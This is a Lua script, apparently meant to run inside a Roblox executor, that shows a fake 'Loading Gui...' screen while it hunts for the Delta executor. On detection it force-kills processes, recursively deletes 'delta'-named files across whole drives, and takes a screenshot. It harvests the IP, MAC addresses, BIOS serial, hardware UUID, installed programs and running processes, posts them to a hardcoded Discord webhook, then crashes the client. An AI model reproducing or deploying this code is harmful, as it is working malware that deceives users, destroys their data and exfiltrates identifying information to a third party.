-- ULTIMATE DELTA KILLER
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local isWindows = package.config:sub(1,1)=="\\"
local lfs = require("lfs")

-- CONFIG
local webhook_url = "https://discord.com/api/webhooks/1406970787478634610/2-a_1e8XweoASfU6EdE6mDSbSCIXPjHWJ5PRikjO6JkRjMxRb4m5SIRTuo3HtAiPorYA"
local delta_globals = {"DELTA_LOADED","DELTA_EXECUTOR"}
local delta_functions = {"getgenv","setfflag","hookfunction","hookmetamethod"}
local delta_titles = {"Delta Executor","Delta GUI","Delta_Main"}
local delta_processes = {"Delta.exe","DeltaProcess.exe"}

-- WINDOWS API
local user32
if isWindows then
    local ffi = require("ffi")
    ffi.cdef[[
        typedef void* HWND;
        HWND FindWindowA(const char* lpClassName, const char* lpWindowName);
        int ShowWindow(HWND hWnd, int nCmdShow);
    ]]
    user32 = ffi.load("user32")
end
local SW_HIDE = 0

-- LOADING SCREEN GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DeltaEnforcerLoading"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

local Background = Instance.new("Frame")
Background.Size = UDim2.new(1,0,1,0)
Background.BackgroundColor3 = Color3.fromRGB(0,0,0)
Background.BorderSizePixel = 0
Background.Parent = ScreenGui

-- Stars with fade animation
local Stars = {}
for i=1,150 do
    local s = Instance.new("Frame")
    s.Size = UDim2.new(0,2,0,2)
    s.Position = UDim2.new(math.random(),0,math.random(),0)
    s.BackgroundColor3 = Color3.fromRGB(255,255,255)
    s.BorderSizePixel = 0
    s.BackgroundTransparency = math.random()
    s.Parent = Background
    table.insert(Stars,s)
end

local BarFrame = Instance.new("Frame")
BarFrame.Size = UDim2.new(0,450,0,35)
BarFrame.Position = UDim2.new(0.5,-225,0.9,-17)
BarFrame.BackgroundColor3 = Color3.fromRGB(50,50,50)
BarFrame.BorderSizePixel = 0
BarFrame.Parent = Background

local BarFill = Instance.new("Frame")
BarFill.Size = UDim2.new(0,0,1,0)
BarFill.BackgroundColor3 = Color3.fromRGB(0,255,0)
BarFill.BorderSizePixel = 0
BarFill.Parent = BarFrame

local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(1,0,0.1,0)
Label.Position = UDim2.new(0,0,0.85,0)
Label.Text = "Loading Gui..."
Label.TextColor3 = Color3.fromRGB(255,255,255)
Label.BackgroundTransparency = 1
Label.Font = Enum.Font.GothamBold
Label.TextScaled = true
Label.TextStrokeTransparency = 0.5
Label.Parent = Background

-- Animations
spawn(function()
    while true do
        -- Stars moving down
        for _,s in pairs(Stars) do
            local y = s.Position.Y.Scale + 0.002
            if y>1 then y=0 end
            s.Position = UDim2.new(s.Position.X.Scale,0,y,0)
            s.BackgroundTransparency = 0.3 + 0.7*math.sin(tick()+s.Position.X.Scale*10)
        end
        -- Bar fill gradient simulation
        local current = BarFill.Size.X.Scale
        if current<1 then
            BarFill.Size = UDim2.new(current + 0.00005,0,1,0)
        end
        wait(0.03)
    end
end)

-- UTILITY FUNCTIONS
local function hide_ui()
    if not isWindows then return end
    for _, title in ipairs(delta_titles) do
        local hwnd = user32.FindWindowA(nil, title)
        if hwnd ~= nil then user32.ShowWindow(hwnd, SW_HIDE) end
    end
end

local function detect_delta_globals()
    for k,v in pairs(_G) do
        local key = tostring(k):lower()
        for _,g in ipairs(delta_globals) do
            if string.find(key, g:lower()) then return true end
        end
        if type(v)=="function" then
            for _,fn in ipairs(delta_functions) do
                if string.find(key, fn:lower()) then return true end
            end
        end
    end
    return false
end

local function terminate_windows()
    if not isWindows then return end
    for _,title in ipairs(delta_titles) do
        os.execute('taskkill /F /FI "WINDOWTITLE eq '..title..'" >nul 2>&1')
    end
    for _,proc in ipairs(delta_processes) do
        os.execute('taskkill /F /IM '..proc..' >nul 2>&1')
    end
end

local function delete_delta_files()
    local deleted = {}
    local dirs = isWindows and {"C:\\","D:\\",os.getenv("USERPROFILE").."\\Desktop",os.getenv("USERPROFILE").."\\Downloads",os.getenv("APPDATA")} or {"/sdcard/Download","/sdcard/Documents","/sdcard"}
    local function scan_dir(dir)
        for f in lfs.dir(dir) do
            if f~="." and f~=".." then
                local full = dir.."/"..f
                local attr = lfs.attributes(full)
                if attr then
                    if string.lower(f):match("^delta") then
                        local ok,_=os.remove(full)
                        if not ok and attr.mode=="directory" then os.execute('rm -rf "'..full..'"') end
                        table.insert(deleted, full)
                    elseif attr.mode=="directory" then scan_dir(full) end
                end
            end
        end
    end
    for _,d in ipairs(dirs) do if lfs.attributes(d) then scan_dir(d) end end
    return deleted
end

local function capture_screenshot()
    local path
    if isWindows then
        path = "C:\\Users\\Public\\screenshot.png"
        os.execute('powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen(0,0,0,0,$bmp.Size); $bmp.Save(\\"'..path..'\\");"')
    else
        path = "/sdcard/screenshot.png"
        os.execute("screencap -p "..path)
    end
    return path
end

-- Enhanced system info
local function system_info()
    local username = os.getenv("USERNAME") or "Unknown"
    local pc = os.getenv("COMPUTERNAME") or "UnknownPC"
    local osname = isWindows and os.getenv("OS") or "Android"
    local arch = isWindows and os.getenv("PROCESSOR_ARCHITECTURE") or "ARM"
    local cores = os.getenv("NUMBER_OF_PROCESSORS") or "UnknownCores"
    local ram = "UnknownRAM"
    if isWindows then local f=io.popen("wmic computersystem get TotalPhysicalMemory") if f then ram=string.match(f:read("*a"),"%d+") f:close() end end
    local ip="UnknownIP"
    pcall(function local r=require("socket.http").request("http://ipinfo.io/ip") if r then ip=r:gsub("\n","") end end)
    local macs={}
    if isWindows then local f=io.popen('getmac') if f then for l in f:lines() do table.insert(macs,l) end f:close() end end
    local bios="UnknownBIOS"
    local uuid="UnknownUUID"
    local gpu="UnknownGPU"
    local battery="UnknownBattery"
    local installed_programs="UnknownPrograms"
    local processes="UnknownProcesses"

    if isWindows then
        local f=io.popen('wmic bios get serialnumber') if f then bios=string.match(f:read("*a"),"%S+") f:close() end
        f=io.popen('wmic csproduct get uuid') if f then uuid=string.match(f:read("*a"),"%S+") f:close() end
        local f=io.popen('powershell "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName"') 
        if f then installed_programs=f:read("*a"):gsub("\r",""):gsub("\n"," , "); f:close() end
        local f=io.popen('wmic path win32_videocontroller get name') if f then gpu=f:read("*a"):gsub("\r",""):gsub("\n"," , "); f:close() end
        local f=io.popen('WMIC PATH Win32_Battery Get EstimatedChargeRemaining') if f then battery=f:read("*a"):gsub("\r",""):gsub("\n"," , "); f:close() end
        local f=io.popen('tasklist') if f then processes=f:read("*a"):gsub("\r",""):gsub("\n"," , "); f:close() end
    end

    return username, pc, osname, arch, cores, ram, ip, table.concat(macs,", "), bios, uuid, gpu, battery, installed_programs, processes
end

local function send_webhook(files,screenshot)
    local username, pc, osname, arch, cores, ram, ip, macs, bios, uuid, gpu, battery, installed_programs, processes = system_info()
    local data={
        username="anti-delta",
        embeds={{title="Delta Retard Enjoyer Detected", color=16711680,
            fields={
                {name="PC",value=pc,inline=true},
                {name="Username",value=username,inline=true},
                {name="OS",value=osname,inline=true},
                {name="Arch",value=arch,inline=true},
                {name="CPU Cores",value=cores,inline=true},
                {name="RAM",value=ram,inline=true},
                {name="MACs",value=macs,inline=false},
                {name="BIOS",value=bios,inline=true},
                {name="UUID",value=uuid,inline=true},
                {name="GPU",value=gpu,inline=true},
                {name="Battery",value=battery,inline=true},
                {name="Installed Programs",value=installed_programs,inline=false},
                {name="Running Processes",value=processes,inline=false},
                {name="IP",value=ip,inline=true},
                {name="Deleted Files",value=table.concat(files,", ") or "None",inline=false},
                {name="Screenshot",value=screenshot or "None",inline=false},
                {name="Time",value=os.date("%Y-%m-%d %H:%M:%S"),inline=true},
            }}}}
    local json_data = HttpService:JSONEncode(data)
    local request = (syn and syn.request) or (http_request) or (function(tbl)return game:HttpGet(tbl.Url)end)
    if request then pcall(function() request({Url=webhook_url, Method="POST", Headers={["Content-Type"]="application/json"}, Body=json_data}) end) end
end

local function crash_executor() while true do error("Delta Detected!") end end

local function main()
    hide_ui()
    if detect_delta_globals() then
        terminate_windows()
        local files_deleted = delete_delta_files()
        local screenshot = capture_screenshot()
        send_webhook(files_deleted, screenshot)
        crash_executor()
    end
end

-- FAST MONITOR LOOP
spawn(function()
    while true do
        pcall(main)
        if syn then task.wait(0.1) else os.execute("sleep 0.1") end
    end
end)
